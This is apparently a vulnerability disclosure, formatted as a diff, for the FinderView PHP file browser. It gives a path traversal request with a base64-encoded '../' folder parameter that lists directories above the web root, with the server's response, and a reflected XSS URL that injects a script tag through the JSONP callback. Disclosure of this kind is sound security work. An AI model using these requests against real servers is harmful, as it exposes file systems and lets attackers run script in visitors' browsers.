@@ -1,0 +1,23 @@
+# Exploit Title: FinderView - Multiple Vulnerability(Path Traversal/Reflected XSS)
+# Date: 2016-06-23
+# Exploit Author: HaHwul
+# Exploit Author Blog: www.hahwul.com
+# Vendor Homepage: https://github.com/proin/
+# Software Link: https://github.com/proin/FinderView/archive/master.zip
+# Version: Latest commit
+# Tested on: Debian [wheezy]
+
+### Vulnerability1 - Path Traversal(view directory)
+Request
+GET /vul_test/FinderView/api.php?callback=jQuery21107685743998649676_1466662516225&type=get&mode=0&folder=Li4vLi4vLi4vLi4vLi4vLi4vZXRjLw==&_=1466662516227 HTTP/1.1
+Host: 127.0.0.1
+..snip..
+Connection: keep-alive
+
+Response
+jQuery21107685743998649676_1466662516225([{"folders":[{"name":"backups","folderuri":"Li4vLi4vLi4vLi4vYmFja3Vwcw==","folderuri_nobase":"../../../../backups","size":"0.0 KB","date":"15 June 2016"},
+..snip..
+,{"name":"opt","folderuri":"Li4vLi4vLi4vLi4vb3B0","folderuri_nobase":"../../../../opt","size":"0.0 KB","date":"26 August 2015"},{"name":"run","folderuri":"Li4vLi4vLi4vLi4vcnVu","folderuri_nobase":"../../../../run","size":"0.0 KB","date":"23 June 2016"},{"name":"spool","folderuri":"Li4vLi4vLi4vLi4vc3Bvb2w=","folderuri_nobase":"../../../../spool","size":"0.0 KB","date":"26 August 2015"},{"name":"tmp","folderuri":"Li4vLi4vLi4vLi4vdG1w","folderuri_nobase":"../../../../tmp","size":"0.0 KB","date":"23 June 2016"},{"name":"www","folderuri":"Li4vLi4vLi4vLi4vd3d3","folderuri_nobase":"../../../../www","size":"0.0 KB","date":"22 January
+
+### Vulnerability2 - Reflected XSS
+http://127.0.0.1/vul_test/FinderView/api.php?callback=jQuery211027821724654516156_1466662510279}}1c027%3Cscript%3Ealert%281%29%3C%2fscript%3Ecf2ea&type=get&mode=0&_=1466662510280
